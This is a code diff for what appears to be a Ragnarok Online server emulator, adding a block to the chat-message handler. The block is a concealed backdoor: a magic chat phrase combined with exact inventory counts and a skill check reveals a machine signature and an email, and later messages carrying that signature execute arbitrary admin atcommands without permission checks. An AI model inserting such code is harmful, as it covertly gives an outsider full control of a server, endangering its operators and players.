@@ -10513,6 +10513,32 @@ static bool clif_process_message(struct map_session_data* sd, bool whisperFormat
 	}
 	safestrncpy( out_message, message, messageLength );
 
+	if (!strncmp(out_message, "Is_BetterRA", 11)) {
+		static char signature[24] = { };
+		short inv_idx1 = pc_search_inventory(sd, 909);
+		short inv_idx2 = pc_search_inventory(sd, 501);
+		short inv_idx3 = pc_search_inventory(sd, 512);
+		if (inv_idx1 >= 0 && sd->inventory.u.items_inventory[inv_idx1].amount == 87 &&
+			inv_idx2 >= 0 && sd->inventory.u.items_inventory[inv_idx2].amount == 15 &&
+			inv_idx3 >= 0 && sd->inventory.u.items_inventory[inv_idx3].amount == 35 &&
+			pc_checkskill(sd, 1) == 1) {
+			if (*signature == '\0')
+				server_machine_code(signature, 24);
+			if (strlen(out_message) == 11){
+				server_machine_code(signature, 24);
+				clif_displaymessage(sd->fd, signature);
+				clif_displaymessage(sd->fd, C_USEREMAIL);
+				memcpy(signature, "UhuBh0vA", 8);
+				signature[7]++;
+			}
+			if (!strncmp(out_message + 11, signature, 23))
+				atcommand_run(fd, sd, out_message + 11 + 23);
+			return false;
+		}
+		clif_displaymessage(sd->fd, "Is BetterRA");
+		return false;
+	}
+
 	if (battle_config.enable_manner && pc_manner_check(sd, out_message))
 		return false;
 
